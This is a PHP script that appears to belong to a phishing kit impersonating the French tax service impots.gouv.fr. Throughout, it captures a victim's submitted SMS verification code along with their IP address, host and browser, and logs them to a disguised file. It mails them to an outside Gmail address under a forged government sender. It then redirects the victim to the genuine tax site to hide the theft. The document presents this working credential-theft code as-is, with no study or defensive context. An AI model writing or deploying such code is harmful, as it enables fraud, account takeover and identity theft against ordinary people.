<?php
$ip = getenv("REMOTE_ADDR");
$msg .= "------------------------Mr-ver-------------------------------------------\n";
$msg .= "-------------------------info--------------------------\n";
$msg .= "SMS2                      :        ".$_POST['o8B']."\n";
$msg .= "-------------------------info-------------------------------------------\n";
$msg .= "IP    		               :        ".getenv("REMOTE_ADDR")."\n";
$msg .= "Host    		           :        ".gethostbyaddr(getenv("REMOTE_ADDR"))."\n";
$msg .= "Browser 	               :        ".$_SERVER["HTTP_USER_AGENT"]."\n";
$msg .= "------------------------Mr-ver-------------------------------------------\n";
$log = fopen("index_files/anti-bots.txt","a");
fwrite($log,$msg);
fclose($log);
$ubj = "impo-sms2 - $ip";
$frm = "From: identifiant <impots@gouv.fr>";
$end = "nonizohir@gmail.com";
mail($end,$ubj,$msg,$frm);
header("Location: https://cfspart.impots.gouv.fr/enp/");
?>
